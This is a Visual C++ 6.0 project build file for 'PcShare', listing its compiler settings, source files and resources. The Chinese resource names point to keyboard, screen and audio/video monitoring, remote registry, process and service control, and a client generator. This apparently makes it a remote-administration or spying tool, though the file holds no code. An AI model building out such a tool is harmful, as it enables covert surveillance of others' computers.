# Microsoft Developer Studio Project File - Name="PcShare" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=PcShare - Win32 Release
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "PcShare.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "PcShare.mak" CFG="PcShare - Win32 Release"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "PcShare - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "PcShare - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "PcShare - Win32 Release"

# PROP BASE Use_MFC 6
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir ".\Release"
# PROP BASE Intermediate_Dir ".\Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 6
# PROP Use_Debug_Libraries 0
# PROP Output_Dir ".\Release"
# PROP Intermediate_Dir ".\Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MD /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_AFXDLL" /D "_MBCS" /FR /Yu"stdafx.h" /GF /c
# ADD CPP /nologo /MD /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_AFXDLL" /D "_MBCS" /FR /Yu"stdafx.h" /GF /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "NDEBUG"
# ADD RSC /l 0x804 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib Ws2_32.lib Msimg32.lib Wininet.lib /nologo /subsystem:windows /machine:IX86 /out:"e:\pcshare\PcShare.exe" /pdbtype:sept
# SUBTRACT BASE LINK32 /pdb:none
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib Ws2_32.lib Msimg32.lib Wininet.lib /nologo /subsystem:windows /machine:IX86 /out:"..\bin\PcShare.exe" /pdbtype:sept
# SUBTRACT LINK32 /pdb:none

!ELSEIF  "$(CFG)" == "PcShare - Win32 Debug"

# PROP BASE Use_MFC 6
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir ".\Debug"
# PROP BASE Intermediate_Dir ".\Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 6
# PROP Use_Debug_Libraries 1
# PROP Output_Dir ".\Debug"
# PROP Intermediate_Dir ".\Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MDd /W3 /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_AFXDLL" /D "_MBCS" /FR /Yu"stdafx.h" /GZ /c
# ADD CPP /nologo /MDd /W3 /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_AFXDLL" /D "_MBCS" /FR /Yu"stdafx.h" /GZ /c
# ADD BASE MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "_DEBUG"
# ADD RSC /l 0x804 /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib Ws2_32.lib Wininet.lib Msimg32.lib /nologo /subsystem:windows /incremental:no /debug /machine:IX86 /out:"e:\pcshare\PcShare.exe" /pdbtype:sept
# SUBTRACT BASE LINK32 /pdb:none
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib Ws2_32.lib Wininet.lib Msimg32.lib /nologo /subsystem:windows /incremental:no /debug /machine:IX86 /out:"..\bin\PcShare.exe" /pdbtype:sept
# SUBTRACT LINK32 /pdb:none

!ENDIF 

# Begin Target

# Name "PcShare - Win32 Release"
# Name "PcShare - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=DirDialog.cpp
DEP_CPP_DIRDI=\
	".\DirDialog.h"\
	".\StdAfx.h"\
	

!IF  "$(CFG)" == "PcShare - Win32 Release"

# ADD CPP /nologo /GX /O2 /FR /Yu"stdafx.h"

!ELSEIF  "$(CFG)" == "PcShare - Win32 Debug"

# ADD CPP /nologo /GX /Od /FR /Yu"stdafx.h" /GZ

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\ListViewCtrlEx.cpp
DEP_CPP_LISTV=\
	".\ListViewCtrlEx.h"\
	".\MyMarco.h"\
	".\PcShare.h"\
	".\StdAfx.h"\
	
# End Source File
# Begin Source File

SOURCE=Lzw.cpp
DEP_CPP_LZW_C=\
	".\Lzw.h"\
	".\StdAfx.h"\
	

!IF  "$(CFG)" == "PcShare - Win32 Release"

# ADD CPP /nologo /GX /O2 /FR /Yu"stdafx.h"

!ELSEIF  "$(CFG)" == "PcShare - Win32 Debug"

# ADD CPP /nologo /GX /Od /FR /Yu"stdafx.h" /GZ

!ENDIF 

# End Source File
# Begin Source File

SOURCE=MainFrm.cpp
DEP_CPP_MAINF=\
	".\ListViewCtrlEx.h"\
	".\MainFrm.h"\
	".\myclientinfoview.h"\
	".\myclientmainview.h"\
	".\MyClientProxy.h"\
	".\MyClientTitleDlg.h"\
	".\MyCreateClientDlg.h"\
	".\MyEventView.h"\
	".\MyHtmlView.h"\
	".\MyLink.h"\
	".\MyMarco.h"\
	".\MySetupDlg.h"\
	".\NewMenu.h"\
	".\PcShare.h"\
	".\StdAfx.h"\
	

!IF  "$(CFG)" == "PcShare - Win32 Release"

# ADD CPP /nologo /GX /O2 /FR /Yu"stdafx.h"

!ELSEIF  "$(CFG)" == "PcShare - Win32 Debug"

# ADD CPP /nologo /GX /Od /FR /Yu"stdafx.h" /GZ

!ENDIF 

# End Source File
# Begin Source File

SOURCE=MyClientInfoView.cpp
DEP_CPP_MYCLI=\
	".\myclientinfoview.h"\
	".\MyMarco.h"\
	".\PcShare.h"\
	".\StdAfx.h"\
	

!IF  "$(CFG)" == "PcShare - Win32 Release"

# ADD CPP /nologo /GX /O2 /FR /Yu"stdafx.h"

!ELSEIF  "$(CFG)" == "PcShare - Win32 Debug"

# ADD CPP /nologo /GX /Od /FR /Yu"stdafx.h" /GZ

!ENDIF 

# End Source File
# Begin Source File

SOURCE=MyClientMainView.cpp
DEP_CPP_MYCLIE=\
	".\ListViewCtrlEx.h"\
	".\myclientmainview.h"\
	".\MyMarco.h"\
	".\PcShare.h"\
	".\StdAfx.h"\
	

!IF  "$(CFG)" == "PcShare - Win32 Release"

# ADD CPP /nologo /GX /O2 /FR /Yu"stdafx.h"

!ELSEIF  "$(CFG)" == "PcShare - Win32 Debug"

# ADD CPP /nologo /GX /Od /FR /Yu"stdafx.h" /GZ

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\MyClientProxy.cpp
DEP_CPP_MYCLIEN=\
	".\MyClientProxy.h"\
	".\MyMarco.h"\
	".\PcShare.h"\
	".\StdAfx.h"\
	
# End Source File
# Begin Source File

SOURCE=MyClientTitleDlg.cpp
DEP_CPP_MYCLIENT=\
	".\MyClientTitleDlg.h"\
	".\MyMarco.h"\
	".\PcShare.h"\
	".\StdAfx.h"\
	

!IF  "$(CFG)" == "PcShare - Win32 Release"

# ADD CPP /nologo /GX /O2 /FR /Yu"stdafx.h"

!ELSEIF  "$(CFG)" == "PcShare - Win32 Debug"

# ADD CPP /nologo /GX /Od /FR /Yu"stdafx.h" /GZ

!ENDIF 

# End Source File
# Begin Source File

SOURCE=MyCreateClientDlg.cpp
DEP_CPP_MYCRE=\
	".\Lzw.h"\
	".\MyCreateClientDlg.h"\
	".\MyLink.h"\
	".\MyMarco.h"\
	".\PcShare.h"\
	".\StdAfx.h"\
	".\WjcDes.h"\
	

!IF  "$(CFG)" == "PcShare - Win32 Release"

# ADD CPP /nologo /GX /O2 /FR /Yu"stdafx.h"

!ELSEIF  "$(CFG)" == "PcShare - Win32 Debug"

# ADD CPP /nologo /GX /Od /FR /Yu"stdafx.h" /GZ

!ENDIF 

# End Source File
# Begin Source File

SOURCE=MyEventView.cpp
DEP_CPP_MYEVE=\
	".\ListViewCtrlEx.h"\
	".\MyEventView.h"\
	".\MyMarco.h"\
	".\PcShare.h"\
	".\StdAfx.h"\
	

!IF  "$(CFG)" == "PcShare - Win32 Release"

# ADD CPP /nologo /GX /O2 /FR /Yu"stdafx.h"

!ELSEIF  "$(CFG)" == "PcShare - Win32 Debug"

# ADD CPP /nologo /GX /Od /FR /Yu"stdafx.h" /GZ

!ENDIF 

# End Source File
# Begin Source File

SOURCE=MyGlobalFuc.cpp
DEP_CPP_MYGLO=\
	".\MyMarco.h"\
	".\StdAfx.h"\
	

!IF  "$(CFG)" == "PcShare - Win32 Release"

# ADD CPP /nologo /GX /O2 /FR /Yu"stdafx.h"

!ELSEIF  "$(CFG)" == "PcShare - Win32 Debug"

# ADD CPP /nologo /GX /Od /FR /Yu"stdafx.h" /GZ

!ENDIF 

# End Source File
# Begin Source File

SOURCE=MyHtmlView.cpp
DEP_CPP_MYHTM=\
	".\MyHtmlView.h"\
	".\MyMarco.h"\
	".\PcShare.h"\
	".\StdAfx.h"\
	

!IF  "$(CFG)" == "PcShare - Win32 Release"

# ADD CPP /nologo /GX /O2 /FR /Yu"stdafx.h"

!ELSEIF  "$(CFG)" == "PcShare - Win32 Debug"

# ADD CPP /nologo /GX /Od /FR /Yu"stdafx.h" /GZ

!ENDIF 

# End Source File
# Begin Source File

SOURCE=MyLink.cpp
DEP_CPP_MYLIN=\
	".\MyLink.h"\
	".\StdAfx.h"\
	

!IF  "$(CFG)" == "PcShare - Win32 Release"

# ADD CPP /nologo /GX /O2 /FR /Yu"stdafx.h"

!ELSEIF  "$(CFG)" == "PcShare - Win32 Debug"

# ADD CPP /nologo /GX /Od /FR /Yu"stdafx.h" /GZ

!ENDIF 

# End Source File
# Begin Source File

SOURCE=MySetupDlg.cpp
DEP_CPP_MYSET=\
	".\DirDialog.h"\
	".\MyMarco.h"\
	".\MySetupDlg.h"\
	".\PcShare.h"\
	".\StdAfx.h"\
	

!IF  "$(CFG)" == "PcShare - Win32 Release"

# ADD CPP /nologo /GX /O2 /FR /Yu"stdafx.h"

!ELSEIF  "$(CFG)" == "PcShare - Win32 Debug"

# ADD CPP /nologo /GX /Od /FR /Yu"stdafx.h" /GZ

!ENDIF 

# End Source File
# Begin Source File

SOURCE=MyThreadFunc.cpp
DEP_CPP_MYTHR=\
	".\MyMarco.h"\
	".\PcShare.h"\
	".\StdAfx.h"\
	

!IF  "$(CFG)" == "PcShare - Win32 Release"

# ADD CPP /nologo /GX /O2 /FR /Yu"stdafx.h"

!ELSEIF  "$(CFG)" == "PcShare - Win32 Debug"

# ADD CPP /nologo /GX /Od /FR /Yu"stdafx.h" /GZ

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\MyTrace.cpp
DEP_CPP_MYTRA=\
	".\MyTrace.h"\
	".\StdAfx.h"\
	
# End Source File
# Begin Source File

SOURCE=.\NewMenu.cpp
DEP_CPP_NEWME=\
	".\MyTrace.h"\
	".\NewMenu.h"\
	".\StdAfx.h"\
	{$(INCLUDE)}"FC\src\afximpl.h"\
	
# End Source File
# Begin Source File

SOURCE=PcShare.cpp
DEP_CPP_PCSHA=\
	".\ListViewCtrlEx.h"\
	".\MainFrm.h"\
	".\myclientinfoview.h"\
	".\myclientmainview.h"\
	".\MyEventView.h"\
	".\MyHtmlView.h"\
	".\MyMarco.h"\
	".\NewMenu.h"\
	".\PcShare.h"\
	".\StdAfx.h"\
	

!IF  "$(CFG)" == "PcShare - Win32 Release"

# ADD CPP /nologo /GX /O2 /FR /Yu"stdafx.h"

!ELSEIF  "$(CFG)" == "PcShare - Win32 Debug"

# ADD CPP /nologo /GX /Od /FR /Yu"stdafx.h" /GZ

!ENDIF 

# End Source File
# Begin Source File

SOURCE=PcShare.rc
# End Source File
# Begin Source File

SOURCE=StdAfx.cpp
DEP_CPP_STDAF=\
	".\StdAfx.h"\
	

!IF  "$(CFG)" == "PcShare - Win32 Release"

# ADD CPP /nologo /GX /O2 /FR /Yc"stdafx.h"

!ELSEIF  "$(CFG)" == "PcShare - Win32 Debug"

# ADD CPP /nologo /GX /Od /FR /Yc"stdafx.h" /GZ

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\WjcDes.cpp
DEP_CPP_WJCDE=\
	".\StdAfx.h"\
	".\WjcDes.h"\
	
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=DirDialog.h
# End Source File
# Begin Source File

SOURCE=.\ListViewCtrlEx.h
# End Source File
# Begin Source File

SOURCE=Lzw.h
# End Source File
# Begin Source File

SOURCE=MainFrm.h
# End Source File
# Begin Source File

SOURCE=myclientinfoview.h
# End Source File
# Begin Source File

SOURCE=myclientmainview.h
# End Source File
# Begin Source File

SOURCE=.\MyClientProxy.h
# End Source File
# Begin Source File

SOURCE=MyClientTitleDlg.h
# End Source File
# Begin Source File

SOURCE=MyCreateClientDlg.h
# End Source File
# Begin Source File

SOURCE=MyEventView.h
# End Source File
# Begin Source File

SOURCE=MyHtmlView.h
# End Source File
# Begin Source File

SOURCE=MyLink.h
# End Source File
# Begin Source File

SOURCE=MyMarco.h
# End Source File
# Begin Source File

SOURCE=MySetupDlg.h
# End Source File
# Begin Source File

SOURCE=.\MyTrace.h
# End Source File
# Begin Source File

SOURCE=.\NewMenu.h
# End Source File
# Begin Source File

SOURCE=PcShare.h
# End Source File
# Begin Source File

SOURCE=Resource.h
# End Source File
# Begin Source File

SOURCE=StdAfx.h
# End Source File
# Begin Source File

SOURCE=.\WjcDes.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# Begin Source File

SOURCE="res\1-1.bmp"
# End Source File
# Begin Source File

SOURCE=res\10.BMP
# End Source File
# Begin Source File

SOURCE=res\11.BMP
# End Source File
# Begin Source File

SOURCE=res\12.BMP
# End Source File
# Begin Source File

SOURCE=res\13.BMP
# End Source File
# Begin Source File

SOURCE=res\14.BMP
# End Source File
# Begin Source File

SOURCE=res\2.BMP
# End Source File
# Begin Source File

SOURCE=res\22.BMP
# End Source File
# Begin Source File

SOURCE=res\23.BMP
# End Source File
# Begin Source File

SOURCE=res\24.BMP
# End Source File
# Begin Source File

SOURCE=res\26.BMP
# End Source File
# Begin Source File

SOURCE=res\27.BMP
# End Source File
# Begin Source File

SOURCE=res\28.BMP
# End Source File
# Begin Source File

SOURCE=res\3.BMP
# End Source File
# Begin Source File

SOURCE=res\4.BMP
# End Source File
# Begin Source File

SOURCE=res\5.BMP
# End Source File
# Begin Source File

SOURCE=res\5104.ICO
# End Source File
# Begin Source File

SOURCE=res\6.BMP
# End Source File
# Begin Source File

SOURCE=res\7.BMP
# End Source File
# Begin Source File

SOURCE=res\8.BMP
# End Source File
# Begin Source File

SOURCE=res\9.BMP
# End Source File
# Begin Source File

SOURCE=res\banner.gif
# End Source File
# Begin Source File

SOURCE=res\bin00001.bin
# End Source File
# Begin Source File

SOURCE=res\bin00002.bin
# End Source File
# Begin Source File

SOURCE=res\bitmap13.bmp
# End Source File
# Begin Source File

SOURCE=res\CHECKMRK.ICO
# End Source File
# Begin Source File

SOURCE=res\Downing.ico
# End Source File
# Begin Source File

SOURCE=res\exe1.bin
# End Source File
# Begin Source File

SOURCE=res\exe_clie.bin
# End Source File
# Begin Source File

SOURCE=res\FileTrans.ico
# End Source File
# Begin Source File

SOURCE=res\Frame.ico
# End Source File
# Begin Source File

SOURCE=res\gif_inde.bin
# End Source File
# Begin Source File

SOURCE=.\hand.cur
# End Source File
# Begin Source File

SOURCE=res\hand.cur
# End Source File
# Begin Source File

SOURCE=.\hdrdown.bmp
# End Source File
# Begin Source File

SOURCE=.\res\hdrdown.bmp
# End Source File
# Begin Source File

SOURCE=.\hdrup.bmp
# End Source File
# Begin Source File

SOURCE=.\res\hdrup.bmp
# End Source File
# Begin Source File

SOURCE=res\ico00003.ico
# End Source File
# Begin Source File

SOURCE=.\res\icon1.ico
# End Source File
# Begin Source File

SOURCE=res\icon9.ico
# End Source File
# Begin Source File

SOURCE=res\icon_com.ico
# End Source File
# Begin Source File

SOURCE=res\idr_main.ico
# End Source File
# Begin Source File

SOURCE=res\link_logo.gif
# End Source File
# Begin Source File

SOURCE=res\NETHOOD.ICO
# End Source File
# Begin Source File

SOURCE=res\PcShare.ico
# End Source File
# Begin Source File

SOURCE=res\PcShare.rc2
# End Source File
# Begin Source File

SOURCE=res\PcShareDoc.ico
# End Source File
# Begin Source File

SOURCE=res\sanparty.gif
# End Source File
# Begin Source File

SOURCE=res\Screen.ico
# End Source File
# Begin Source File

SOURCE=res\SysConTrol.ico
# End Source File
# Begin Source File

SOURCE=res\Toolbar.bmp
# End Source File
# Begin Source File

SOURCE=res\toolbar1.bmp
# End Source File
# Begin Source File

SOURCE=res\toolbar_.bmp
# End Source File
# Begin Source File

SOURCE=res\UnDown.ico
# End Source File
# Begin Source File

SOURCE=res\W95MBX01.ICO
# End Source File
# Begin Source File

SOURCE=res\W95MBX04.ICO
# End Source File
# Begin Source File

SOURCE=res\WAIT07.CUR
# End Source File
# Begin Source File

SOURCE=res\Waitdown.ico
# End Source File
# Begin Source File

SOURCE="res\帮助.b"
# End Source File
# Begin Source File

SOURCE=".\res\帮助.bmp"
# End Source File
# Begin Source File

SOURCE="res\超级终端"
# End Source File
# Begin Source File

SOURCE=".\res\超级终端.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\服务管理"
# End Source File
# Begin Source File

SOURCE=".\res\服务管理.bmp"
# End Source File
# Begin Source File

SOURCE="res\关于.b"
# End Source File
# Begin Source File

SOURCE=".\res\关于.bmp"
# End Source File
# Begin Source File

SOURCE="res\管理客户"
# End Source File
# Begin Source File

SOURCE=".\res\管理客户.bmp"
# End Source File
# Begin Source File

SOURCE="res\键盘监控"
# End Source File
# Begin Source File

SOURCE=".\res\键盘监控.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\进程管理"
# End Source File
# Begin Source File

SOURCE=".\res\进程管理.bmp"
# End Source File
# Begin Source File

SOURCE="res\屏幕监控"
# End Source File
# Begin Source File

SOURCE=".\res\屏幕监控.bmp"
# End Source File
# Begin Source File

SOURCE="res\全部开始"
# End Source File
# Begin Source File

SOURCE="res\全部暂停"
# End Source File
# Begin Source File

SOURCE="res\全局设置"
# End Source File
# Begin Source File

SOURCE=".\res\全局设置.bmp"
# End Source File
# Begin Source File

SOURCE="res\删除客户"
# End Source File
# Begin Source File

SOURCE="res\删除任务"
# End Source File
# Begin Source File

SOURCE="res\生成客户"
# End Source File
# Begin Source File

SOURCE=".\res\生成客户.bmp"
# End Source File
# Begin Source File

SOURCE="res\视音频."
# End Source File
# Begin Source File

SOURCE=".\res\视音频监"
# End Source File
# Begin Source File

SOURCE=".\res\视音频监控.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\注册表管"
# End Source File
# Begin Source File

SOURCE=".\res\注册表管理.bmp"
# End Source File
# End Group
# Begin Source File

SOURCE=.\MyVipDlg.htm
# End Source File
# End Target
# End Project
